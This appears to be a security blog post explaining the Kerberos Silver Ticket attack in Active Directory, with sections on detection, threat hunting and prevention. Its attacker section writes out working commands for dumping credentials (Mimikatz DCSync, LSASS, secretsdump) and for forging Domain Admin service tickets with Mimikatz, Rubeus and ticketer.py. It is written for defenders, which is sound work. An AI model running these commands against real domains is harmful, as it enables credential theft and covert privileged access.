---
title: "Silver Ticket"
description: "Silver Ticket attack in depth: PAC internals, service account hash exploitation, KDC bypass mechanics, per-service detection, PAC validation enforcement, and gMSA remediation."
date: "2026-06-12 10:00"
category: "Active Directory"
tags:
  - Active Directory
  - Kerberos
  - Persistence
  - Lateral Movement
  - Threat Hunting
published: true
archived: false
pinned: false
featured: false
author: "Luca Manfrin"
readingTime: true
---

## Definition

A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket created using the NTLM hash (or AES keys) of a specific service account or computer account. Unlike a Golden Ticket (which uses the krbtgt hash), a Silver Ticket only grants access to one specific service — but it does so without any interaction with the KDC, making it almost invisible to DC-side monitoring.

---

## PAC Internals — What Makes Forging Possible

Every Kerberos service ticket contains a **Privilege Attribute Certificate (PAC)** — a Microsoft extension embedded in the encrypted portion of the ticket. The PAC contains:

- The user's SID
- The user's group memberships (as SIDs)
- User account information (account name, domain)
- Two signatures:
  - **Server signature**: signed with the service account's key
  - **KDC signature**: signed with the krbtgt key

In a normal ticket, both signatures are present and valid. The service validates the server signature (which it can, because it knows its own key). PAC validation against the KDC signature is **optional** — and disabled by default on many services.

When an attacker forges a TGS using the service account's hash, they can:
- Write any username into the PAC (including non-existent accounts)
- Write any group SIDs into the PAC (including Domain Admins RID 512)
- Sign the server signature (they have the key)
- **Leave the KDC signature invalid or absent** — the service won't check it unless PAC validation is explicitly enabled

---

## What You Need to Forge a Silver Ticket

| Requirement | How to Obtain |
|---|---|
| Target service account NTLM hash | LSASS dump, DCSync, NTDS.dit extraction |
| Domain SID | `whoami /user`, `Get-ADDomain`, `wmic` |
| Target SPN | `setspn -Q */*`, `Get-ADUser` |
| Username to impersonate | Any string — real or fake |
| Domain FQDN | Domain environment info |

---

## How an Attacker Performs This Attack

### Step 1 — Obtain the Service Account Hash

```cmd
# Mimikatz — DCSync for the service account
privilege::debug
lsadump::dcsync /user:svc_sql /domain:domain.local

# LSASS dump if account is active on current machine
sekurlsa::logonpasswords
```

```bash
# Impacket — remote DCSync
python3 secretsdump.py domain.local/DomainAdmin:password@dc01.domain.local \
  -just-dc-user svc_sql
```

For **computer accounts** (e.g., to forge a CIFS ticket for `fileserver$`):

```cmd
# Extract the computer account hash
lsadump::dcsync /user:FILESERVER$
```

### Step 2 — Get the Domain SID

```powershell
# Multiple methods
(Get-ADDomain).DomainSID.Value
whoami /user   # SID is S-1-5-21-XXXX-XXXX-XXXX-<RID>, strip the last part
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
```

### Step 3 — Forge the Silver Ticket

```cmd
# Mimikatz — forge and inject in one step
kerberos::golden \
  /user:FakeAdmin \
  /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:fileserver.domain.local \
  /service:cifs \
  /rc4:NTLMHASHOFCOMPUTERACCOUNT \
  /groups:512,513,520 \
  /startoffset:0 \
  /endin:600 \
  /renewmax:10080 \
  /ptt

# For AES256 (harder to detect, harder to forge without AES keys)
kerberos::golden /user:FakeAdmin /domain:domain.local \
  /sid:S-1-5-21-XXX /target:sqlserver.domain.local /service:MSSQLSvc \
  /aes256:AES256KEYHERE /ptt
```

```powershell
# Rubeus — Silver Ticket forging
.\Rubeus.exe silver \
  /service:cifs/fileserver.domain.local \
  /rc4:NTLMHASH \
  /user:FakeAdmin \
  /domain:domain.local \
  /sid:S-1-5-21-XXX-XXX-XXX \
  /groups:512 \
  /ptt

# Verify ticket injection
klist
```

```bash
# Impacket — ticketer.py
python3 ticketer.py \
  -nthash NTLMHASH \
  -domain-sid S-1-5-21-XXX-XXX-XXX \
  -domain domain.local \
  -spn cifs/fileserver.domain.local \
  FakeAdmin

export KRB5CCNAME=FakeAdmin.ccache
python3 smbclient.py -k -no-pass fileserver.domain.local
```

### Common Silver Ticket Targets

| Service (SPN prefix) | What it grants |
|---|---|
| `cifs` | SMB shares, file access |
| `host` | Remote admin, WMI, scheduled tasks, SCM |
| `wsman` | WinRM, PowerShell remoting |
| `http` | IIS web apps, SharePoint |
| `MSSQLSvc` | SQL Server access |
| `rpcss` | WMI via RPC |
| `ldap` | LDAP queries to DC (dangerous) |
| `GC` | Global Catalog queries |

---

## Security Problems

**1. The KDC is completely bypassed.** DC security logs (4768, 4769, 4770) show nothing during a Silver Ticket attack — the ticket never touches the KDC after forging.

**2. Impersonation of non-existent users.** The forged PAC can claim any identity. Services that do group-membership-based access control read the PAC — if it says Domain Admin, access is granted.

**3. Unlimited persistence.** An attacker can set a 10-year validity window. The ticket will work until:
  - The service account password is changed (and all sessions expire)
  - The machine account password rotates (default: 30 days)

**4. Computer accounts are easy targets.** Every domain-joined workstation and server has a computer account with a locally stored machine account hash (in LSASS). Extracting it is straightforward with local admin rights.

**5. Lateral movement without domain credentials.** If an attacker has local admin on a machine, they can extract that machine's computer account hash, forge a `cifs/machine` Silver Ticket for another target, and move laterally — never touching the DC.

---

## How to Detect It

### The Core Challenge

Silver Tickets bypass the DC. You cannot detect them by monitoring DC logs alone. Detection requires:
1. **Host-based telemetry** on target services
2. **Correlation**: comparing logons on the target service against KDC ticket issuance
3. **PAC validation**: forcing the service to call the KDC for PAC verification

### Event 4624 on Target Servers

```powershell
# Detect Kerberos logons on target servers from accounts that don't exist in AD
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
  Where-Object {
    $_.Properties[10].Value -eq 'Kerberos' -and
    $_.Properties[8].Value  -eq 3
  } |
  ForEach-Object {
    $user = $_.Properties[5].Value
    if (-not (Get-ADUser -Filter { SamAccountName -eq $user } -ErrorAction SilentlyContinue)) {
      [PSCustomObject]@{
        Time   = $_.TimeCreated
        User   = $user
        Source = $_.Properties[18].Value
        Host   = $env:COMPUTERNAME
      }
    }
  }
```

### Correlate Service Logons vs DC Ticket Issuance

A Silver Ticket produces a Kerberos logon on the target service but generates **no Event 4769** on the DC (because the ticket was forged, not requested from the KDC):

```powershell
# On the target server: collect recent Kerberos logons
$serviceLogons = Get-WinEvent -FilterHashtable @{
  LogName = 'Security'; Id = 4624
} | Where-Object {
  $_.Properties[10].Value -eq 'Kerberos' -and
  $_.Properties[8].Value  -eq 3
} | Select-Object TimeCreated, @{ n = 'User'; e = { $_.Properties[5].Value } }

# On the DC: collect 4769 events for the same time window and users
# If a user appears in $serviceLogons but NOT in DC 4769 within ±5 minutes → suspicious
```

### Enable PAC Validation on Services

When PAC validation is enabled, the service contacts the KDC to verify the PAC signatures. A forged ticket (with invalid KDC signature) generates Event 4769 with failure code `0x1f`.

```powershell
# Enable PAC validation on the KDC (registry on DC)
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
  -Name "ValidateKdcPacSignature" `
  -Value 1 -Type DWord

# Alert on 4769 with failure code 0x1f (PAC validation failure)
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4769 } |
  Where-Object { $_.Properties[7].Value -eq '0x1f' } |
  Select-Object TimeCreated,
    @{ n = 'Account'; e = { $_.Properties[0].Value } },
    @{ n = 'Service'; e = { $_.Properties[2].Value } },
    @{ n = 'IP';      e = { $_.Properties[9].Value } }
```

> [!WARNING]
> Enabling `ValidateKdcPacSignature = 1` causes all service ticket validations to contact the KDC, which adds DC load and latency. In environments with many services and high ticket volume, test the performance impact before deploying broadly. Value `2` enforces validation strictly and can break services that fail PAC validation.

---

## Honeypot Service Account Detection

Create a service account with a registered SPN that is never legitimately accessed. Any TGS usage for this service is an immediate alert — if it bypasses the DC (Silver Ticket), detection depends on the target server's 4624 logs.

```powershell
# Honeypot service account
New-ADUser -Name "svc_printlegacy" -SamAccountName "svc_printlegacy" `
  -AccountPassword (ConvertTo-SecureString "7!kXp@9mN#3vQ&5wL^2rZ*" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true

Set-ADUser svc_printlegacy -Add @{
  ServicePrincipalName = "PrintService/legacyprint01.domain.local:9100"
}

# Monitor for 4769 on DC (Kerberoasting) AND 4624 on servers for this account
```

---

## How to Hunt It (Post-Incident)

### Phase 1 — Identify high-value service and computer account hashes at risk

```powershell
# Service accounts with SPNs — Silver Ticket candidates
Get-ADUser -Filter { ServicePrincipalName -ne "$null" } `
  -Properties ServicePrincipalName, PasswordLastSet |
  Select-Object SamAccountName, PasswordLastSet,
    @{ n = 'PasswordAgeDays'; e = {
        [int](((Get-Date) - $_.PasswordLastSet).TotalDays)
      }
    },
    @{ n = 'SPN'; e = { $_.ServicePrincipalName -join ' | ' } } |
  Sort-Object PasswordAgeDays -Descending

# Computer accounts — CIFS/HOST Silver Ticket candidates
Get-ADComputer -Filter * -Properties PasswordLastSet |
  Where-Object { $_.PasswordLastSet -lt (Get-Date).AddDays(-60) } |
  Select-Object Name, PasswordLastSet
```

### Phase 2 — Hunt for logons with no DC 4769 precursor

This requires correlating logs from target servers with DC logs — manual or SIEM-assisted:

```powershell
# On each target server: extract Kerberos logon events with user + timestamp
$srvLogons = Get-WinEvent -FilterHashtable @{
  LogName = 'Security'; Id = 4624
} | Where-Object {
  $_.Properties[10].Value -eq 'Kerberos'
} | Select-Object TimeCreated,
    @{ n = 'User'; e = { $_.Properties[5].Value } },
    @{ n = 'IP';   e = { $_.Properties[18].Value } }

# Export and compare against DC 4769 events in your SIEM
$srvLogons | Export-Csv "C:\Temp\srv_kerberos_logons.csv" -NoTypeInformation
```

---

## How to Prevent It

### 1. gMSA for All Service Accounts

gMSA accounts have 240-character auto-rotating passwords. Silver Ticket forging requires the service account hash — gMSA hashes are computationally impossible to crack, and the password rotates regularly.

```powershell
New-ADServiceAccount -Name "gmsa_sql" `
  -DNSHostName "sqlserver.domain.local" `
  -ServicePrincipalNames "MSSQLSvc/sqlserver.domain.local:1433" `
  -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers_Group"
```

### 2. AES-Only Kerberos

```powershell
# Set AES-only on service accounts
Set-ADUser svc_iis -Replace @{ 'msDS-SupportedEncryptionTypes' = 24 }  # AES128+AES256
```

Attackers need the AES keys (not just the NTLM hash) to forge AES tickets. AES keys require AES-encrypted secrets from DCSync — a higher bar.

### 3. Machine Account Password Rotation

```powershell
# Force immediate computer account password rotation (on the machine itself)
Reset-ComputerMachinePassword -Server dc01.domain.local -Credential (Get-Credential)

# Configure shorter machine account password change interval via GPO
# Computer Configuration → Windows Settings → Security Settings →
#   Local Policies → Security Options →
#   Domain member: Maximum machine account password age → 15 days
```

### 4. Enable PAC Validation

```powershell
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
  -Name "ValidateKdcPacSignature" -Value 1 -Type DWord
```

### 5. Monitor Computer Account Hash Changes

```powershell
# Any machine account with a very old password (>45 days) may have been used for Silver Tickets
Get-ADComputer -Filter * -Properties PasswordLastSet, Enabled |
  Where-Object {
    $_.PasswordLastSet -lt (Get-Date).AddDays(-45) -and $_.Enabled
  } |
  Select-Object Name, PasswordLastSet
```

---

## Conclusion

Silver Tickets are surgically precise — one ticket, one service, no DC contact. Their power lies in what they bypass: all DC-side Kerberos logging. Countermeasures must operate at the service level (PAC validation, host-based 4624 monitoring) and at the credential level (gMSA eliminates the forgeable hash entirely). If you can answer "who authenticated to this service in the last 24 hours without a matching DC-issued ticket?", you have functional Silver Ticket detection.
